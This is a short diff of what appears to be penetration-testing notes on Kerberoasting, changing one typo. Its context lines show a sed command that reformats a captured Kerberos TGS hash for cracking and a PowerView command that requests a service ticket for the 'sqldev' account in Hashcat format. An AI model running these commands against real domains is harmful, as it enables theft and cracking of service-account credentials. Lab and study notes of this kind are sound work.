@@ -101,7 +101,7 @@ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_
 
 ```
 
-Ezyest way lol
+Easier way lol
 
 ```powershell
 Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
